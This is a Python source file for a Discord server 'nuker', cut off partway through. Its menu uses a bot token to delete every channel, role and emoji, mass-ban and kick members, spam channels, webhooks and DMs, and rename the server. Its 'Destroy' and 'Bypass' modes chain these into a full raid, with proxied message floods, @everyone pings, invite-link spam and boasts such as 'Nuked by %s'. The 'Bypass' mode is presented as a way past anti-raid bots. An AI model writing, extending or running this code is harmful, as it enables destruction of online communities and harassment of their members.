# main.py (Complete and Updated with Sexy Tqdm Bars)
# CHECKING FOR REQUIREMENTS.

import sys, os

missing_modules = []

# Ensure requirements.txt exists before trying to open it
if not os.path.exists("requirements.txt"):
    print("Error: requirements.txt not found. Please create it with necessary modules listed.")
    sys.exit(1)

with open("requirements.txt", "r") as file:
    lines = [i.strip() for i in file.readlines()]

for line in lines:
    if "==" in line:
        module = line.split("==")[0]
    else:
        module = line

    try:
        __import__(module)
    except ModuleNotFoundError:
        missing_modules.append(module)
else:
    if len(missing_modules) != 0:
        print("There is some missing modules that you don't have!")
        print("The following command will be executed for installing those modules: ", "pip install " + " && ".join(missing_modules))

        i = input("Do you want to install them? [y,n]: ")

        if i.lower().strip().startswith("y"):
            os.system("pip install " + " ".join(missing_modules))
        else:
            print("Goodbye !")
            sys.exit()

# ============================ MAIN MODULES ============================================
import aiohttp
import asyncio
import json
import os
import sys
import time
import random
from concurrent.futures import ThreadPoolExecutor
from tqdm.asyncio import tqdm # Import tqdm from tqdm.asyncio for gather to work with async operations

from colorama import Fore
from pystyle import * # Keeping pystyle import as its specific functions (System.Clear, System.Title, System.Size, Cursor.HideCursor, Cursor.ShowCursor) are used.

executor = ThreadPoolExecutor(max_workers=1024)
sem = asyncio.Semaphore(200) # Global concurrency limiter for Discord API requests

# ===============================    CLASSES    =========================================

# Ensure these imports correctly point to your Plugins directory
from Plugins.funcs import Funcs
from Plugins.logger import Logger
from Plugins.nuking import Nuking
from Plugins.tools import Tools

# =============================== SOME GLOBAL VARIABLES ==================================
global_timeot = 0 # This variable seems unused, consider removing if not needed
token = None
names = None
amount = None
guild_name = None
invite_link = None
info = None # Stores guild and user information
headers = {} # HTTP headers for API requests

# ========================== Async Helper Functions =========================

async def fetch(session, method, url, retries=5, backoff_factor=1.5, **kwargs):
    """
    Async wrapper for making HTTP requests with aiohttp, with intelligent retry logic
    based on Discord's 'retry_after' header and exponential backoff with jitter.
    """
    for attempt in range(retries):
        try:
            async with session.request(method, url, **kwargs) as response:
                if response.status == 429:
                    try:
                        retry_after = float(response.headers.get("retry-after", 1))
                        # Add jitter to the retry_after delay to prevent thundering herd problem
                        delay = retry_after + random.uniform(0.1, 0.5)
                        await Logger.Log.warning(f"Rate limited. Retrying after {delay:.2f} seconds (Attempt {attempt + 1}/{retries}).")
                        await asyncio.sleep(delay)
                        continue  # Retry the request immediately after delay
                    except ValueError:
                        await Logger.Error.error("Invalid retry-after header value. Retrying after 1 second.")
                        await asyncio.sleep(1 + random.uniform(0.1, 0.5))
                        continue
                
                # Raise HTTPError for bad status (e.g., 400, 403, 404, 500)
                # This will be caught by the outer try-except block
                response.raise_for_status()  
                
                # Attempt to parse JSON response, return True for 204 No Content
                if response.status == 204:
                    return True
                
                return await response.json()
        
        except aiohttp.ClientResponseError as e:
            # Log detailed HTTP errors, especially 4xx ones
            try:
                error_details = await e.response.json()
                await Logger.Error.error(f"HTTP error: {e.status} {e.message} for {url}. Details: {error_details} (Attempt {attempt + 1}/{retries}).")
            except aiohttp.ContentTypeError:
                await Logger.Error.error(f"HTTP error: {e.status} {e.message} for {url}. No JSON details. (Attempt {attempt + 1}/{retries}).")
            
            if e.status >= 400 and e.status < 500: # Do not retry client errors (e.g., Bad Request, Forbidden, Not Found)
                return None # Return None to indicate failure without further retries
            
            if attempt < retries - 1:
                delay = backoff_factor ** attempt + random.uniform(0.1, 0.5)
                await Logger.Log.warning(f"Retrying after {delay:.2f} seconds...")
                await asyncio.sleep(delay)
                continue
            else:
                raise  # Re-raise if all retries fail for server errors
        
        except aiohttp.ClientError as e:
            await Logger.Error.error(f"Client network error: {e} for {url}. (Attempt {attempt + 1}/{retries}).")
            if attempt < retries - 1:
                delay = backoff_factor ** attempt + random.uniform(0.1, 0.5)
                await Logger.Log.warning(f"Retrying after {delay:.2f} seconds...")
                await asyncio.sleep(delay)
                continue
            else:
                raise  # Re-raise if all retries fail
        
        except Exception as e:
            await Logger.Error.error(f"An unexpected error occurred during fetch: {e} for {url}. (Attempt {attempt + 1}/{retries}).")
            if attempt < retries - 1:
                delay = backoff_factor ** attempt + random.uniform(0.1, 0.5)
                await Logger.Log.warning(f"Retrying after {delay:.2f} seconds...")
                await asyncio.sleep(delay)
                continue
            else:
                raise  # Re-raise if all retries fail
    
    return None # Explicitly return None if all retries fail

async def run_in_executor(loop, func, *args):
    """
    Runs a synchronous function in the thread pool, reusing the global executor.
    """
    return await loop.run_in_executor(executor, func, *args)

# ============================== MAIN SCRIPT LOGIC ==========================================

async def main(token: str, guild_id):
    global info, headers, names, amount, invite_link
    headers = {"Authorization": f"Bot {token}", "Content-Type": "application/json"}

    # Define tqdm bar format with gradient colors from Funcs
    # This will be used in all tqdm.gather calls
    tqdm_bar_format_gradient = (
        f"{Funcs._apply_multi_color_gradient_internal(' ', Funcs.tqdm_bar_gradient_colors)}"
        "{{l_bar}}{{bar}}"
        f"{Funcs._apply_multi_color_gradient_internal(' ', list(reversed(Funcs.tqdm_bar_gradient_colors)))}"
        "| {{n_fmt}}/{{total_fmt}} [{{elapsed}}<{{remaining}}, {{rate_fmt}}{{postfix}}]"
    )


    # Display the main help menu
    Funcs.print_help_menu(info)

    # Get the current event loop (usually the default one)
    loop = asyncio.get_event_loop()

    # Centralized ClientSession setup for the main operations.
    # This session will be passed to Nuking class methods.
    connector = aiohttp.TCPConnector(limit=200) # High limit for concurrent connections
    async with aiohttp.ClientSession(connector=connector) as session:
        # Fetch guild and user information if not already available
        if not info:
            async with sem: # Use semaphore to limit concurrency for this initial API call
                info = await Tools.information(guild_id, token)

        # Helper for formatting numbers with leading zero
        num = lambda n: "0" + n if len(n) != 2 else n
        
        # Define the desired colors from Logger for clarity and blend in prompts
        gb = Logger.GLOW_BLUE
        gp = Logger.GLOW_PURPLE
        reset = Logger.RESET

        # Prompt user for choice, including the new "Change Server" option (28)
        choice = await Funcs.get_input(
            f"{gb}┌─╼{gp}[{gb}${gp}] {gb}{info['user']['username']}{gp}@{gb}{info['guild']['name']}{reset}\n"
            f"{gb}└────╼{gp} >>{gb} Choose: {gp}",
            checker=lambda x: x.isnumeric() and int(x) != 0 and int(x) <= 28, # Updated upper limit to 28
        )
        choice = num(choice)

        print() # Add a newline for better readability

        async def back_to_manu():
            """Prompts user to press enter to return to the main menu."""
            input(f"{Logger.ERROR_RED}\n!! IF YOU WANT TO RETURN TO THE MAIN MENU, PRESS ENTER !!{Logger.RESET}\n")
            return await main(token, guild_id)

        # Initialize the Nuking class with the current token and guild ID
        nuker = Nuking(token, guild_id)

        # --- OPTION 01: Delete all channels ---
        if choice == "01":
            url = Tools.api(f"guilds/{guild_id}/channels")
            try:
                # Fetch channels, ensure it's an empty list if fetch returns None
                channels_data = await fetch(session, 'GET', url, headers=headers, proxy=Tools.proxy()) or []
                channels = [ch["id"] for ch in channels_data]
            except Exception as e:
                await Logger.Error.error(f"Failed to fetch channels: {e}")
                return await back_to_manu()

            async def delete_channel_task(channel_id):
                async with sem: # Use semaphore to limit concurrent deletions
                    if await nuker.delete_channel(session, channel_id):
                        await Logger.Success.delete(channel_id)
                    else:
                        await Logger.Error.delete(channel_id)

            tasks = [delete_channel_task(channel) for channel in channels]
            await tqdm.gather(*tasks, total=len(tasks), desc="Deleting Channels", bar_format=tqdm_bar_format_gradient)
            return await back_to_manu()

        # --- OPTION 02: Delete all roles ---
        elif choice == "02":
            url = Tools.api(f"guilds/{guild_id}/roles")
            try:
                roles_data = await fetch(session, 'GET', url, headers=headers) or []
                roles = [role["id"] for role in roles_data]
            except Exception as e:
                await Logger.Error.error(f"Failed to fetch roles: {e}")
                return await back_to_manu()

            async def delete_role(role_id):
                async with sem:
                    if await nuker.delete_role(session, role_id):
                        await Logger.Success.delete(role_id)
                    else:
                        await Logger.Error.delete(role_id)
            tasks = [delete_role(role) for role in roles]
            await tqdm.gather(*tasks, total=len(tasks), desc="Deleting Roles", bar_format=tqdm_bar_format_gradient)
            return await back_to_manu()

        # --- OPTION 03: Mass ban members ---
        elif choice == "03":
            api = Tools.api(f"/guilds/{guild_id}/members")
            users = await Tools.break_limit(session, api, token)

            ban_limit = await Funcs.get_input(
                "Enter number of members to ban (0 for all): ",
                lambda x: x.isnumeric() and int(x) >= 0
            )
            ban_limit = int(ban_limit)

            members_to_ban = users[:ban_limit] if ban_limit > 0 else users

            async def ban_member(member):
                async with sem:
                    if await nuker.ban(session, member):
                        await Logger.Success.success(f"Banned {Fore.YELLOW}{member}")
                    else:
                        await Logger.Error.error(f"Failed to ban {Fore.RED}{member}")

            tasks = [ban_member(member) for member in members_to_ban]
            await tqdm.gather(*tasks, total=len(tasks), desc="Banning Members", bar_format=tqdm_bar_format_gradient)
            return await back_to_manu()

        # --- OPTION 04: Mass Kick members ---
        elif choice == "04":
            api = Tools.api(f"/guilds/{guild_id}/members")
            users = await Tools.break_limit(session, api, token)

            async def kick_member(member):
                async with sem:
                    if await nuker.kick(session, member):
                        await Logger.Success.success(f"Kicked {Fore.YELLOW}{member}")
                    else:
                        await Logger.Error.error(f"Failed to kick {Fore.RED}{member}")

            tasks = [kick_member(member) for member in users]
            await tqdm.gather(*tasks, total=len(tasks), desc="Kicking Members", bar_format=tqdm_bar_format_gradient)
            return await back_to_manu()

       # --- OPTION 05: Mass create channels ---
        elif choice == "05":
            name = await Funcs.get_input("Enter a name for channels: ", lambda x: len(x) < 100 and x != "")
            count = await Funcs.get_input("How many channels do you want to create? [1,500]: ",
                                     lambda x: x.isnumeric() and int(x) != 0 and int(x) <= 500)
            count = int(count)
            channel_type_str = await Funcs.get_input("Enter the type of the channels: [text, voice]: ",
                                             lambda x: x.lower().strip() in ["text", "voice"])

            types_map = {"voice": 2, "text": 0}
            channel_type_int = types_map[channel_type_str]

            async def create_channel_task(channel_name_for_task, channel_type_value_for_task):
                async with sem:
                    status = await nuker.create_channel(session, channel_name_for_task, channel_type_value_for_task)
                if status:
                    await Logger.Success.create(status)
                else:
                    await Logger.Error.create(channel_name_for_task)

            tasks = [create_channel_task(name, channel_type_int) for _ in range(count)]
            await tqdm.gather(*tasks, total=len(tasks), desc="Creating Channels", bar_format=tqdm_bar_format_gradient)
            return await back_to_manu()
             
        # --- OPTION 06: Mass create roles ---
        elif choice == "06":
            name = await Funcs.get_input("Enter a name for roles: ", lambda x: len(x) < 100 and x != "")
            count = await Funcs.get_input("How many roles do you want to create? [1,250]: ",
                                     lambda x: x.isnumeric() and int(x) != 0 and int(x) <= 250)
            count = int(count)

            async def create_role(name):
                async with sem:
                    status = await nuker.create_role(session, name)
                if status:
                    await Logger.Success.create(status)
                else:
                    await Logger.Error.create(name)

            tasks = [create_role(name) for _ in range(count)]
            await tqdm.gather(*tasks, total=len(tasks), desc="Creating Roles", bar_format=tqdm_bar_format_gradient)
            return await back_to_manu()

        # --- OPTION 07: Unban all members ---
        elif choice == "07":
            url = Tools.api(f"/guilds/{guild_id}/bans")
            banned_users = await Tools.break_limit(session, url, token)

            async def unban_member(member):
                async with sem:
                    if await nuker.unban(session, member):
                        await Logger.Success.success(f"Unbanned {member}")
                    else:
                        await Logger.Error.error(f"Failed to unban {member}")
            tasks = [unban_member(user) for user in banned_users]
            await tqdm.gather(*tasks, total=len(tasks), desc="Unbanning Members", bar_format=tqdm_bar_format_gradient)
            return await back_to_manu()
        
        # --- OPTION 08: Webhook spam ---
        elif choice == "08":
            spam_type = await Funcs.get_input(
                "Use custom webhook (enter 'custom') or default (enter 'default')?: ",
                lambda x: x.lower().strip() in ["custom", "default"]
            )

            message = await Funcs.get_input("Enter a message for spam: ", lambda x: len(x) <= 4000 and x != "")
            count = await Funcs.get_input("How many times do you want to send this message? [1, ∞]: ",
                                     lambda x: x.isnumeric() and int(x) != 0)
            count = int(count)

            webhook_urls = []
            if spam_type.lower().strip() == "custom":
                custom_webhook_name = await Funcs.get_input("Enter a name for the custom webhook: ", lambda x: len(x) < 100 and x != "")
                custom_webhook_url = await Funcs.get_input("Enter the custom webhook URL: ", lambda x: x.startswith("https://discord.com/api/webhooks/") and x != "")
                webhook_urls.append(custom_webhook_url)
                await Logger.Log.info(f"Using custom webhook: {custom_webhook_url}")
            else: # Default behavior
                default_webhook_name = "ZZZZZZZZ"
                # FIX: Updated the default PFP URL to a working placeholder
                default_pfp_url = "https://placehold.co/128x128/000000/FFFFFF?text=PFP" 

                # Fetch channels (only text channels)
                try:
                    channels = await nuker._make_request(session, "GET", f"/guilds/{guild_id}/channels") or []
                    text_channels = [ch["id"] for ch in channels if ch["type"] == 0]
                    if not text_channels:
                        await Logger.Error.error("No text channels found to create webhooks!")
                        return await back_to_manu()
                except Exception as e:
                    await Logger.Error.error(f"Failed to fetch channels: {e}")
                    return await back_to_manu()

                create_webhook_tasks = []
                for channel_id in text_channels:
                    create_webhook_tasks.append(
                        nuker.create_webhook(session, channel_id, default_webhook_name, avatar_url=default_pfp_url)
                    )
                
                results = await tqdm.gather(*create_webhook_tasks, total=len(create_webhook_tasks), desc="Creating Webhooks", bar_format=tqdm_bar_format_gradient)
                for url_or_exception in results:
                    if isinstance(url_or_exception, str): # Check if it's a valid URL (success)
                        webhook_urls.append(url_or_exception)
                    else:
                        # Error details are already logged by _make_request, just log a general failure here
                        await Logger.Error.error(f"Failed to create a webhook for one channel.") 

                if not webhook_urls:
                    await Logger.Error.error("No webhooks were successfully created!")
                    return await back_to_manu()

            # Spam messages using created webhooks
            spam_tasks = []
            for webhook_url in webhook_urls:
                # Each webhook now handles its own bulk sending sequentially, but multiple webhooks can run concurrently
                spam_tasks.append(
                    nuker.send_webhook_bulk(session, webhook_url, message, count)
                )
            
            await tqdm.gather(*spam_tasks, total=len(spam_tasks), desc="Sending Webhooks", bar_format=tqdm_bar_format_gradient)
            await Logger.Success.create("Webhook Spam Done!")
            return await back_to_manu()
        
        # --- OPTION 09: Message spam guild ---
        elif choice == "09":
            url = Tools.api(f"/guilds/{guild_id}/channels")
            message = await Funcs.get_input("Enter a message for spam: ", lambda x: len(x) <= 4000 and x != "")
            count = await Funcs.get_input("how many times do you want to send this message? [1, ∞]: ",
                                     lambda x: x.isnumeric() and int(x) != 0)
            count = int(count)

            try:
                channels_data = await fetch(session, 'GET', url, headers=headers) or []
                channels = [ch["id"] for ch in channels_data if ch['type'] == 0] # Only text channels
            except Exception as e:
                await Logger.Error.error(f"Failed to fetch channels: {e}")
                return await back_to_manu()

            async def send_message_task(channel_id, msg):
                async with sem:
                    if await nuker.send_message(session, channel_id, msg):
                        await Logger.Success.success(f"Sent message in {Fore.BLUE}{channel_id}")
                    else:
                        await Logger.Error.error(f"Failed to send message in {channel_id}")

            tasks = []
            for _ in range(count):
                for channel in channels:
                    tasks.append(send_message_task(channel, message))
            await tqdm.gather(*tasks, total=len(tasks), desc="Message Spamming", bar_format=tqdm_bar_format_gradient)
            return await back_to_manu()

        # --- OPTION 10: Rename all channels ---
        elif choice == "10":
            url = Tools.api(f"/guilds/{guild_id}/channels")
            name = await Funcs.get_input("Enter a name for channels: ", lambda x: len(x) <= 100 and x != "")

            try:
                channels_data = await fetch(session, 'GET', url, headers=headers) or []
                channels = [ch["id"] for ch in channels_data]
            except Exception as e:
                await Logger.Error.error(f"Failed to fetch channels: {e}")
                return await back_to_manu()

            async def rename_channel_task(channel_id, new_name):
                async with sem:
                    if await nuker.rename_channel(session, new_name, channel_id):
                        await Logger.Success.success(f"Renamed {channel_id}")
                    else:
                        await Logger.Error.error(f"Failed to rename {channel_id}")

            tasks = [rename_channel_task(channel, name) for channel in channels]
            await tqdm.gather(*tasks, total=len(tasks), desc="Renaming Channels", bar_format=tqdm_bar_format_gradient)
            return await back_to_manu()

        # --- OPTION 11: Rename all roles ---
        elif choice == "11":
            name = await Funcs.get_input("Enter a name for roles: ", lambda x: len(x) <= 100 and x != "")
            url = Tools.api(f"guilds/{guild_id}/roles")
            try:
                roles_data = await fetch(session, 'GET', url, headers=headers) or []
                roles = [role["id"] for role in roles_data]
            except Exception as e:
                await Logger.Error.error(f"Failed to fetch roles: {e}")
                return await back_to_manu()

            async def rename_role_task(role_id, new_name):
                async with sem:
                    if await nuker.rename_role(session, role_id, new_name):
                        await Logger.Success.success(f"Renamed {role_id}")
                    else:
                        await Logger.Error.error(f"Failed to rename {role_id}")

            tasks = [rename_role_task(role, name) for role in roles]
            await tqdm.gather(*tasks, total=len(tasks), desc="Renaming Roles", bar_format=tqdm_bar_format_gradient)
            return await back_to_manu()

        # --- OPTION 12: Nick all users ---
        elif choice == "12":
            name = await Funcs.get_input("Enter a nick name for members: ", lambda x: len(x) <= 100 and x != "")
            api = Tools.api(f"/guilds/{guild_id}/members")
            users = await Tools.break_limit(session, api, token)

            async def change_nick_task(member, nick):
                async with sem:
                    if await nuker.change_nick(session, member, nick):
                        await Logger.Success.success(f"Changed nickname for {member}")
                    else:
                        await Logger.Error.error(f"Failed to change nickname for {member}")

            tasks = [change_nick_task(user, name) for user in users]
            await tqdm.gather(*tasks, total=len(tasks), desc="Nicknaming Members", bar_format=tqdm_bar_format_gradient)
            return await back_to_manu()

        # --- OPTION 13: UnNick All users ---
        elif choice == "13":
            api = Tools.api(f"/guilds/{guild_id}/members")
            users = await Tools.break_limit(session, api, token)

            async def change_nick_task(member, nick):
                async with sem:
                    if await nuker.change_nick(session, member, nick):
                        await Logger.Success.success(f"Changed nickname for {member}")
                    else:
                        await Logger.Error.error(f"Failed to change nickname for {member}")
            tasks = [change_nick_task(user, None) for user in users] # Pass None to remove nickname
            await tqdm.gather(*tasks, total=len(tasks), desc="Un-nicknaming Members", bar_format=tqdm_bar_format_gradient)
            return await back_to_manu()

        # --- OPTION 14: Change Guild Name ---
        elif choice == "14":
            name = await Funcs.get_input("Enter a new name for the guild: ", lambda x: len(x) <= 100 and x != "")
            await Logger.Log.started()
            async with sem:
                if await nuker.rename_guild(session, name):
                    await Logger.Success.success(f"Changed Guild name to {name}")
                else:
                    await Logger.Error.error("Failed to change guild name")
            return await back_to_manu()

        # --- OPTION 15: Change Guild Icon ---
        elif choice == "15":
            Cursor.HideCursor() # Hide cursor for cleaner input
            path = await Funcs.get_input(
                "Drag and drop the new icon or enter its path (use 'd' for default icon in root folder): ",
                lambda x: (x == 'd') or (os.path.exists(x) and (x.endswith(".jpg") or x.endswith(".png"))),
            )
            path = path if not path == 'd' else "./server_icon.png" # Default icon path

            await Logger.Log.started()
            async with sem:
                if await nuker.change_guild_icon(session, path):
                    await Logger.Success.success("Changed Guild icon")
                else:
                    await Logger.Error.error("Failed to change icon")

            Cursor.ShowCursor() # Show cursor again
            return await back_to_manu()

        # --- OPTION 16: Remove all emojis ---
        elif choice == "16":
            url = Tools.api(f"guilds/{guild_id}/emojis")
            try:
                emojis_data = await fetch(session, 'GET', url, headers=headers) or []
                emojis = [[e["id"], e["name"]] for e in emojis_data]
            except Exception as e:
                await Logger.Error.error(f"Failed to fetch emojis: {e}")
                return await back_to_manu()

            async def remove_emoji_task(emoji_id):
                async with sem:
                    if await nuker.remove_emoji(session, emoji_id):
                        await Logger.Success.delete(emoji_id)
                    else:
                        await Logger.Error.delete(emoji_id)
            tasks = [remove_emoji_task(emoji_id) for emoji_id, _ in emojis]
            await tqdm.gather(*tasks, total=len(tasks), desc="Removing Emojis", bar_format=tqdm_bar_format_gradient)
            return await back_to_manu()

        # --- OPTION 17: DM all members ---
        elif choice == "17":
            message = await Funcs.get_input("Enter a message to send to them direct message: ",
                                     lambda x: x != "" and len(x) <= 4000)
            api = Tools.api(f"/guilds/{guild_id}/members")
            users = await Tools.break_limit(session, api, token)

            async def send_dm_task(user, msg):
                async with sem:
                    if await nuker.send_direct_message(session, user, msg):
                        await Logger.Success.success(f"Sent DM to {user}")
                    else:
                        await Logger.Error.error(f"Failed to send direct message to {user}")
            tasks = [send_dm_task(user, message) for user in users]
            await tqdm.gather(*tasks, total=len(tasks), desc="DMing Members", bar_format=tqdm_bar_format_gradient)
            return await back_to_manu()

        # --- OPTION 18: NUKE (Destroy/Bypass) ---
        elif choice == "18":
            methods = """
01. Destroy - deletes all channels, roles, emojis and starts spamming, creating channels and banning members
02. Bypass - A Method for bypassing Security and AntiRaid Bots
03. Back

"""
            print(Logger.GLOW_PURPLE + methods)

            ch = await Funcs.get_input(f"{Logger.GLOW_BLUE} Choose: {Logger.ELECTRIC_BLUE}",
                                     checker=lambda x: x.isnumeric() and int(x) != 0 and int(x) <= 3)
            ch = num(ch)

            endpoints = {
                "channels": f"/guilds/{guild_id}/channels",
                "roles": f"/guilds/{guild_id}/roles",
                "members": f"/guilds/{guild_id}/members",
                "emojis": f"/guilds/{guild_id}/emojis",
            }

            async def scrapp(data):
                url = Tools.api(endpoints.get(data))
                try:
                    if data == "members":
                        value = await Tools.break_limit(session, url, token)
                        return value
                    else:
                        response = await fetch(session, 'GET', url, headers=headers) or []
                        value = [i["id"] for i in response]
                        return value
                except Exception as e:
                    await Logger.Error.error(f"Error scrapping {data}: {e}")
                    return []

            global names, amount, invite_link, guild_name

            if ch == "01": # Destroy mode
                invite_link = await Funcs.get_input("Enter your invite link: ", lambda x: x != "") if not invite_link else invite_link

                if not names:
                    name = await Funcs.get_input("Enter your name: ", lambda x: x != "")
                    names = [
                        "%s fucked up here", "fucked by %s", "%s wizzed you ",
                        "%s was here", "Nuked by %s", " "
                    ]
                    names = [i % name if "%s" in i else i for i in names]

                amount = amount if amount else 100
                print(Logger.ERROR_RED + " The job starts in 3 seconds" + Logger.RESET)

                await Logger.Log.started()
                print(Logger.GLOW_PURPLE + "Started scrapping job! ")

                scrapping_datas = ["channels", "roles", "members", "emojis"]

                scrapped_data = {}
                for data in scrapping_datas:
                    print(Logger.GLOW_BLUE + "Scrapping %s%s " % (Logger.GLOW_PURPLE, data))
                    scrapped_data[data] = await scrapp(data)
                    os.makedirs("./Scraped", exist_ok=True) # Ensure Scraped directory exists
                    with open(f"./Scraped/{data}.txt", "w") as file:
                        file.write('\n'.join(scrapped_data[data]))

                s = Logger.Success # Alias for Logger.Success
                e = Logger.Error   # Alias for Logger.Error

                async def delete_resource(type_, id_):
                    if type_ == "channel":
                        async with sem:
                            if await nuker.delete_channel(session, id_):
                                await s.delete(id_)
                            else:
                                await e.delete(id_)
                    elif type_ == "role":
                        async with sem:
                            if await nuker.delete_role(session, id_):
                                await s.delete(id_)
                            else:
                                await e.delete(id_)
                    elif type_ == "emoji":
                        async with sem:
                            if await nuker.remove_emoji(session, id_):
                                await s.delete(id_)
                            else:
                                await e.delete(id_)

                async def purge_server():
                    tasks = []
                    for channel_id in scrapped_data.get("channels", []):
                        tasks.append(delete_resource("channel", channel_id))
                    for role_id in scrapped_data.get("roles", []):
                        tasks.append(delete_resource("role", role_id))
                    for emoji_id in scrapped_data.get("emojis", []):
                        tasks.append(delete_resource("emoji", emoji_id))
                    print(Logger.GLOW_BLUE + "Starting resource deletion...")
                    await tqdm.gather(*tasks, total=len(tasks), desc="Purging Server", bar_format=tqdm_bar_format_gradient)

                async def ban_members(users):
                    async def ban_member_task(member):
                        async with sem:
                            if await nuker.ban(session, member):
                                await Logger.Success.success(f"Banned {Fore.YELLOW}{member}")
                            else:
                                await Logger.Error.error(f"Failed to ban {Fore.RED}{member}")

                    tasks = [ban_member_task(member) for member in users]
                    print(Logger.GLOW_BLUE + "Starting member banning...")
                    await tqdm.gather(*tasks, total=len(tasks), desc="Banning Members", bar_format=tqdm_bar_format_gradient)

                def choisex(list_of_items):
                    return random.choice(list_of_items)

                async def create(amount: int):
                    create_tasks = []

                    async def create_role_task():
                        name = choisex(names)
                        async with sem:
                            status = await nuker.create_role(session, name)
                        if status:
                            await s.create(status)
                        else:
                            await e.create(name)

                    async def create_channel_and_spam_task():
                        name = choisex(names)
                        async with sem:
                            status = await nuker.create_channel(session, name, 0)
                        if status:
                            await s.create(status)
                            webhook_url = await nuker.create_webhook(session, status, choisex(names))
                            if webhook_url:
                                await nuker.send_webhook_bulk(session, webhook_url, f"# {choisex(names)} @everyone @here {invite_link}", amount)
                            
                            await nuker.send_message(session, status, f"# {choisex(names)} @everyone @here {invite_link}")
                        else:
                            await e.create(name)

                    for _ in range(amount):
                        create_tasks.append(create_role_task())
                        create_tasks.append(create_channel_and_spam_task())

                    print(Logger.GLOW_BLUE + "Starting channel and role creation/spam...")
                    await tqdm.gather(*create_tasks, total=len(create_tasks), desc="Creating/Spamming", bar_format=tqdm_bar_format_gradient)

                print(Logger.GLOW_BLUE + "Changing guild icon and name...")
                await nuker.change_guild_icon(session, "./server_icon.png") # Assumes server_icon.png exists
                await nuker.rename_guild(session, choisex(names) if not guild_name else guild_name)

                await purge_server()
                await create(200) # Create 200 channels/roles

                try:
                    with open("./Scraped/members.txt", "r") as file:
                        users = [i.strip() for i in file.readlines() if i.strip()]
                except FileNotFoundError:
                    await Logger.Error.error("Scraped/members.txt not found. Cannot ban members.")
                    users = []
                await ban_members(users)
                return await back_to_manu()


            elif ch == "02": # Bypass mode
                invite_link = await Funcs.get_input("Enter your invite link: ", lambda x: x != "") if not invite_link else invite_link

                if not names:
                    name = await Funcs.get_input("Enter your base name: ", lambda x: x != "")
                    names = [
                        "%s bypassed here", "Bypassed by %s", "%s nuked you",
                        "%s was here", "Nuked by %s", " "
                    ]
                    names = [i % name if "%s" in i else i for i in names]

                amount = amount if amount else 100
                print(Logger.ERROR_RED + " The job starts in 3 seconds" + Logger.RESET)

                await Logger.Log.started()
                print(Logger.GLOW_PURPLE + "Started super max speed bypass flooding job!")

                s = Logger.Success
                e = Logger.Error

                async def flood_webhook(current_session, webhook_url, message, flood_count=500):
                    tasks = []
                    for _ in range(flood_count):
                        tasks.append(
                            current_session.post(
                                webhook_url,
                                json={"content": message},
                                proxy=Tools.proxy(),
                                timeout=nuker.timeout
                            )
                        )
                    responses = await asyncio.gather(*tasks, return_exceptions=True)
                    success = sum(1 for r in responses if not isinstance(r, Exception) and r.status in (200, 204))
                    return success

                async def flood_channel_messages(current_session, channel_id, message, flood_count=500):
                    url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
                    headers_dm = {"Authorization": f"Bot {nuker.token}", "Content-Type": "application/json"}
                    payload = {"content": message}
                    tasks = []
                    for _ in range(flood_count):
                        tasks.append(
                            current_session.post(
                                url,
                                headers=headers_dm,
                                json=payload,
                                proxy=Tools.proxy(),
                                timeout=nuker.timeout
                            )
                        )
                    responses = await asyncio.gather(*tasks, return_exceptions=True)
                    success = sum(1 for r in responses if not isinstance(r, Exception) and r.status in (200, 201))
                    return success

                def choisex(list_of_items):
                    return random.choice(list_of_items)

                async def create_and_flood_task_bypass():
                    channel_name = choisex(names) + "-" + str(random.randint(1000, 9999))
                    role_name = choisex(names) + "-" + str(random.randint(1000, 9999))
                    webhook_name = choisex(names) + "-" + str(random.randint(1000, 9999))

                    async with sem:
                        channel_id = await nuker.create_channel(session, channel_name, 0)
                    if channel_id:
                        await s.create(f"Channel created: {channel_name}")
                    else:
                        await e.create(f"Failed channel creation: {channel_name}")
                        return

                    async with sem:
                        role_id = await nuker.create_role(session, role_name)
                    if role_id:
                        await s.create(f"Role created: {role_name}")
                    else:
                        await e.create(f"Failed role creation: {role_name}")

                    async with sem:
                        webhook_url = await nuker.create_webhook(session, channel_id, webhook_name)
                    if webhook_url:
                        await s.create(f"Webhook created: {webhook_name}")

                    message = f"# {choisex(names)} @everyone @here {invite_link}"

                    flood_tasks = []
                    if webhook_url:
                        flood_tasks.append(flood_webhook(session, webhook_url, message, flood_count=500))
                    flood_tasks.append(flood_channel_messages(session, channel_id, message, flood_count=500))

                    results = await asyncio.gather(*flood_tasks, return_exceptions=True)

                    for i, res in enumerate(results):
                        if isinstance(res, Exception):
                            await e.error(f"Flood task {i} failed with error: {res}")
                        else:
                            await s.success(f"Flood task {i} succeeded with {res} successful requests")

                print(Logger.GLOW_PURPLE + "Starting initial cleanup and setup for Bypass mode...")

                await nuker.change_guild_icon(session, "./server_icon.png") # Assumes server_icon.png exists
                await nuker.rename_guild(session, choisex(names) if not guild_name else guild_name)

                scrapping_datas = ["channels", "roles", "emojis"]
                scrapped_data = {}
                for data in scrapping_datas:
                    print(Logger.GLOW_BLUE + "Scrapping %s%s " % (Logger.GLOW_PURPLE, data))
                    scrapped_data[data] = await scrapp(data)
                    os.makedirs("./Scraped", exist_ok=True)
                    with open(f"./Scraped/{data}.txt", "w") as file:
                        file.write('\n'.join(scrapped_data[data]))

                async def delete_resource_bypass(type_, id_):
                    if type_ == "channel":
                        async with sem:
                            if await nuker.delete_channel(session, id_):
                                await s.delete(id_)
                            else:
                                await e.delete(id_)
                    elif type_ == "role":
                        async with sem:
                            if await nuker.delete_role(session, id_):
                                await s.delete(id_)
                            else:
                                await e.delete(id_)
                    elif type_ == "emoji":
                        async with sem:
                            if await nuker.remove_emoji(session, id_):
                                await s.delete(id_)
                            else:
                                await e.delete(id_)

                purge_tasks = []
                for channel_id in scrapped_data.get("channels", []):
                    purge_tasks.append(delete_resource_bypass("channel", channel_id))
                for role_id in scrapped_data.get("roles", []):
                    purge_tasks.append(delete_resource_bypass("role", role_id))
                for emoji_id in scrapped_data.get("emojis", []):
                    purge_tasks.append(delete_resource_bypass("emoji", emoji_id))

                print(Logger.GLOW_BLUE + "Starting initial resource cleanup...")
                await tqdm.gather(*purge_tasks, total=len(purge_tasks), desc="Bypass Cleanup", bar_format=tqdm_bar_format_gradient)
                print(Logger.GLOW_PURPLE + "Initial cleanup complete. Starting flooding and banning.")

                flood_and_create_tasks = [create_and_flood_task_bypass() for _ in range(amount)]
                print(Logger.GLOW_BLUE + "Starting flood and create tasks (Bypass mode)...")
                await tqdm.gather(*flood_and_create_tasks, total=len(flood_and_create_tasks), desc="Bypass Flooding/Creating", bar_format=tqdm_bar_format_gradient)

                try:
                    with open("./Scraped/members.txt", "r") as f:
